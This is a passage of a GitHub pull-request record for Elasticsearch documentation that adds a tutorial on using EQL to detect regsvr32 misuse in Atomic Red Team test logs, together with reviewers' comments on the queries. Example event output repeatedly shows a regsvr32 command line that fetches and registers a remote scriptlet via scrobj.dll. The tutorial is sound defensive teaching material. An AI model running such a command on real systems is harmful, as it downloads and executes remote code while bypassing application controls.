{"pr_number": 59105, "pr_title": "[DOCS] EQL: Add threat detection example", "pr_createdAt": "2020-07-06T21:42:47Z", "pr_url": "https://github.com/elastic/elasticsearch/pull/59105", "timeline": [{"oid": "4497a29bbac83003618e40c9e85b67c3753fc6f4", "url": "https://github.com/elastic/elasticsearch/commit/4497a29bbac83003618e40c9e85b67c3753fc6f4", "message": "[DOCS] EQL: Add threat detection example\n\nAdds a threat detection example tutorial based on the\n[`Getting started with EQL` blog post][0].\n\nThe example can later be amended when/if support for the `unique` and\n`count` pipes are added.\n\n[0]: https://www.elastic.co/blog/getting-started-eql", "committedDate": "2020-07-06T21:39:46Z", "type": "commit"}, {"oid": "2c1887790f2cb86230788702b88b9095cf586a3a", "url": "https://github.com/elastic/elasticsearch/commit/2c1887790f2cb86230788702b88b9095cf586a3a", "message": "iter", "committedDate": "2020-07-07T14:12:17Z", "type": "commit"}, {"oid": "96dd94437947a5b9c19b2c1fdcd06fc265301bdd", "url": "https://github.com/elastic/elasticsearch/commit/96dd94437947a5b9c19b2c1fdcd06fc265301bdd", "message": "reword", "committedDate": "2020-07-07T14:36:19Z", "type": "commit"}, {"oid": "c2bcc47e27bad204106a052715e10cbb8dded12d", "url": "https://github.com/elastic/elasticsearch/commit/c2bcc47e27bad204106a052715e10cbb8dded12d", "message": "correction", "committedDate": "2020-07-07T14:39:08Z", "type": "commit"}, {"oid": "f0542fdd61c54ff14ad08c0f57e80800133073bf", "url": "https://github.com/elastic/elasticsearch/commit/f0542fdd61c54ff14ad08c0f57e80800133073bf", "message": "update link to data", "committedDate": "2020-07-07T15:04:32Z", "type": "commit"}, {"oid": "4af3c373369eaf6070982c8ba2b1befd67428ddd", "url": "https://github.com/elastic/elasticsearch/commit/4af3c373369eaf6070982c8ba2b1befd67428ddd", "message": "add `by` to sequence query", "committedDate": "2020-07-07T15:58:20Z", "type": "commit"}, {"oid": "a4cfa3890d8fbdf2b975ec82c7120d5e584613c9", "url": "https://github.com/elastic/elasticsearch/commit/a4cfa3890d8fbdf2b975ec82c7120d5e584613c9", "message": "Convert to ECS", "committedDate": "2020-07-08T21:31:02Z", "type": "commit"}, {"oid": "89ba8d60fa7dd1fcf4944ba8f90b57e1574466bb", "url": "https://github.com/elastic/elasticsearch/commit/89ba8d60fa7dd1fcf4944ba8f90b57e1574466bb", "message": "Swap dev admon for experimental", "committedDate": "2020-07-08T21:54:39Z", "type": "commit"}, {"oid": "99145f59d6e6b6b6fdd238a3578a205627c25d73", "url": "https://github.com/elastic/elasticsearch/commit/99145f59d6e6b6b6fdd238a3578a205627c25d73", "message": "Fix out of spec schema", "committedDate": "2020-07-08T22:22:19Z", "type": "commit"}, {"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ1NTgxNTI1NA==", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r455815254", "bodyText": "@costin does this always get turned into a string?", "author": "rw-access", "createdAt": "2020-07-16T14:09:26Z", "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,427 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `sec_logs` index with the following\n+<<docs-bulk,bulk API>> request:\n+\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/sec_logs/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n+\n+[source,console]\n+----\n+GET /_cat/indices/sec_logs?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:sec_logs]\n+\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n+\n+[source,txt]\n+----\n+health status index     docs.count\n+yellow open   sec_logs         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /sec_logs/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:sec_logs]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.\n+\n+To narrow down the results, check if the command line was used during any of\n+these events. Append `and process.command_line > 0` to the previous EQL query.\n+This limits matching results to events that contain a `process.command_line`\n+value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /sec_logs/_eql/search\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\" and process.command_line > 0\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:sec_logs]\n+\n+The query matches one event. Based on the event's `process.command_line` value,\n+`regsvr32.exe` was used to register a script as `scrobj.dll`. This fits known\n+regsvr32 misuse behavior.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 21,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"sec_logs\",\n+        \"_id\": \"gl5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"parent\": {\n+              \"name\": \"cmd.exe\",\n+              \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010AA385401}\",\n+              \"executable\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n+            },\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"command_line\": \"regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\n+            \"ppid\": 2652\n+          },\n+          \"logon_id\": 217055,\n+          \"@timestamp\": 131883573237130000,\n+          \"event\": {\n+            \"category\": \"process\",\n+            \"type\": \"creation\"\n+          },\n+          \"user\": {\n+            \"full_name\": \"bob\",\n+            \"domain\": \"ART-DESKTOP\",\n+            \"id\": \"ART-DESKTOP\\\\bob\"\n+          }\n+        },\n+        \"sort\": [\n+          131883573237130000\n+        ]\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 21/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"gl5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-check-for-malicious-script-loads]]\n+=== Check for malicious script loads\n+\n+You now know that `regsvr32.exe` was used to register\n+a potentially malicious script as `scrob.dll`. Next, find any processes that\n+later load the `scrob.dll` file.\n+\n+Modify the previous EQL query as follows:\n+\n+* Change the `any` keyword to `file`. This means the query only matches\n+events with an `event.category` of `file`.\n+* Add the `file.name == \"scrobj.dll` condition to check for loads of\n+the `scrobj.dll` file.\n+\n+[source,console]\n+----\n+GET /sec_logs/_eql/search\n+{\n+  \"query\": \"\"\"\n+    file where process.name == \"regsvr32.exe\" and file.name == \"scrobj.dll\"\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:sec_logs]\n+\n+The query matches an event, confirming that `scrobj.dll` was later loaded by\n+`regsvr32.exe`.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 5,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"sec_logs\",\n+        \"_id\": \"ol5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n+          },\n+          \"file\": {\n+            \"path\": \"C:\\\\Windows\\\\System32\\\\scrobj.dll\",\n+            \"name\": \"scrobj.dll\"\n+          },\n+          \"@timestamp\": 131883573237450016,\n+          \"event\": {\n+            \"category\": \"file\"\n+          }\n+        },\n+        \"sort\": [\n+          131883573237450016\n+        ]\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 5/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"ol5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-detemine-likelihood-of-sucess]]\n+=== Determine likelihood of success\n+\n+In many cases, malicious scripts are used to download other remote files. If\n+this occurred, the attack progressed and might have succeeded.\n+\n+Use an <<eql-sequences,EQL sequence query>> to check for the following series of\n+events, in order:\n+\n+. A `regsvr32.exe` process, which could have been used to register malicious\n+scripts as `scrobj.dll`\n+. A load of the `scrobj.dll` file\n+. Any network event, which could indicate the download of a remote file\n+\n+To match, each event in the sequence must share the same `process.pid` (process\n+ID) field value.\n+\n+[source,console]\n+----\n+GET /sec_logs/_eql/search\n+{\n+  \"query\": \"\"\"\n+    sequence by process.pid\n+      [process where process.name == 'regsvr32.exe']\n+      [file where file.name == 'scrobj.dll']\n+      [network where true]\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:sec_logs]\n+\n+The query matches a sequence, indicating the attack likely succeeded.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 25,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"sequences\": [\n+      {\n+        \"join_keys\": [\n+          \"2012\"", "originalCommit": "99145f59d6e6b6b6fdd238a3578a205627c25d73", "replyToReviewId": null, "replies": [{"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ1NTg0Mjk5Mg==", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r455842992", "bodyText": "I believe so - it looks like a bug. Raised #59707", "author": "costin", "createdAt": "2020-07-16T14:45:50Z", "replyToReviewId": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ1NTgxNTI1NA=="}], "type": "inlineReview"}, {"oid": "68c6796b78d63ef4f8e8c6412c5ebb149e5996d0", "url": "https://github.com/elastic/elasticsearch/commit/68c6796b78d63ef4f8e8c6412c5ebb149e5996d0", "message": "Merge remote-tracking branch 'upstream/master' into docs__eql-threat-detection", "committedDate": "2020-07-16T15:17:26Z", "type": "commit"}, {"oid": "fc672d2b12541dc8f2cf81cb596a252ebd51dbaa", "url": "https://github.com/elastic/elasticsearch/commit/fc672d2b12541dc8f2cf81cb596a252ebd51dbaa", "message": "Update response format for #59552", "committedDate": "2020-07-16T15:35:35Z", "type": "commit"}, {"oid": "4fcd7291f72efb1d319077e85cbf7365b11b7e1d", "url": "https://github.com/elastic/elasticsearch/commit/4fcd7291f72efb1d319077e85cbf7365b11b7e1d", "message": "Improve lang", "committedDate": "2020-07-16T16:59:32Z", "type": "commit"}, {"oid": "6bfd73de2ededd6028d58b392850186d21d99725", "url": "https://github.com/elastic/elasticsearch/commit/6bfd73de2ededd6028d58b392850186d21d99725", "message": "fix ord list formatting", "committedDate": "2020-07-22T18:26:58Z", "type": "commit"}, {"oid": "08861b016c455b51a44ba23ef987fb5374641254", "url": "https://github.com/elastic/elasticsearch/commit/08861b016c455b51a44ba23ef987fb5374641254", "message": "Merge remote-tracking branch 'upstream/master' into docs__eql-threat-detection", "committedDate": "2020-08-05T18:04:35Z", "type": "commit"}, {"oid": "b08e698f33bb3dde6b5789d62943dce19d7ae00f", "url": "https://github.com/elastic/elasticsearch/commit/b08e698f33bb3dde6b5789d62943dce19d7ae00f", "message": "fix naming collision", "committedDate": "2020-08-05T18:42:03Z", "type": "commit"}, {"oid": "5cc367237a8c1eb83e1ab165612a4277fb17f5ea", "url": "https://github.com/elastic/elasticsearch/commit/5cc367237a8c1eb83e1ab165612a4277fb17f5ea", "message": "fix include", "committedDate": "2020-08-05T19:04:21Z", "type": "commit"}, {"oid": "f31c960703c14de408a11b972445c80b1309683d", "url": "https://github.com/elastic/elasticsearch/commit/f31c960703c14de408a11b972445c80b1309683d", "message": "fix cat response alignment", "committedDate": "2020-08-05T19:14:49Z", "type": "commit"}, {"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYxNDk1NQ==", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470614955", "bodyText": "The ATT&CK taxonomy has slightly changed since this original PR, so this is the new link. They left in redirects though, so the old one still works, but this is where it redirects to.\n\n  \n    \n      \n        Suggested change\n        \n          \n    \n\n        \n      \n    \n    \n      \n          \n            \n            https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n          \n          \n            \n            https://attack.mitre.org/techniques/T1218/010/[regsvr32 misuse] in Windows event", "author": "rw-access", "createdAt": "2020-08-14T13:12:42Z", "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event", "originalCommit": "f31c960703c14de408a11b972445c80b1309683d", "replyToReviewId": null, "replies": null, "type": "inlineReview"}, {"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYxNjExNg==", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470616116", "bodyText": "Should this number be increased, since we already know there are 150?", "author": "rw-access", "createdAt": "2020-08-14T13:14:50Z", "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>", "originalCommit": "f31c960703c14de408a11b972445c80b1309683d", "replyToReviewId": null, "replies": null, "type": "inlineReview"}, {"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYxNjg1OQ==", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470616859", "bodyText": "Alternatively, we could do process where ... right?\n\n  \n    \n      \n        Suggested change\n        \n          \n    \n\n        \n      \n    \n    \n      \n          \n            \n                any where process.name == \"regsvr32.exe\" and process.command_line > 0\n          \n          \n            \n                any where process.name == \"regsvr32.exe\" and process.command_line != null", "author": "rw-access", "createdAt": "2020-08-14T13:16:19Z", "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.\n+\n+To narrow down the results, check if the command line was used during any of\n+these events. Append `and process.command_line > 0` to the previous EQL query.\n+This limits matching results to events that contain a `process.command_line`\n+value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\" and process.command_line > 0", "originalCommit": "f31c960703c14de408a11b972445c80b1309683d", "replyToReviewId": null, "replies": null, "type": "inlineReview"}, {"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYxNzUyMg==", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470617522", "bodyText": "Suggested change\n        \n          \n    \n\n        \n      \n    \n    \n      \n          \n            \n            these events. Append `and process.command_line > 0` to the previous EQL query.\n          \n          \n            \n            these events. Append `and process.command_line != null` to the previous EQL query.\n          \n      \n    \n    \n  \n\nI think it's also worth mentioning event.category, and by switching to process where ... you filter by category of process", "author": "rw-access", "createdAt": "2020-08-14T13:17:32Z", "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.\n+\n+To narrow down the results, check if the command line was used during any of\n+these events. Append `and process.command_line > 0` to the previous EQL query.", "originalCommit": "f31c960703c14de408a11b972445c80b1309683d", "replyToReviewId": null, "replies": null, "type": "inlineReview"}, {"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYxOTUzNw==", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470619537", "bodyText": "I wouldn't say they are false positives, but more that they are superfluous. Like you know all the things that regsvr32.exe did -- it loaded some DLLs, dropped some files, made a network connection. But maybe it's better to show in this example that you want to know how regsvr32.exe was called in the first place. That's often the context you want to know when hunting -- where did this come from, and how?\nI think by articulating that goal, it makes it more clear why you want to look for the process creation event: it contains user.name, which says what user executed the process, as well as process.parent.name, so you know where it came from, and process.command_line, which gives you information of everything that regsvr32.exe was  told to do. That's why we end up valuing the process creation events so much.\nI think if you add those points, it'll add more punch/story and insight into the thought process to the example.", "author": "rw-access", "createdAt": "2020-08-14T13:21:33Z", "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious 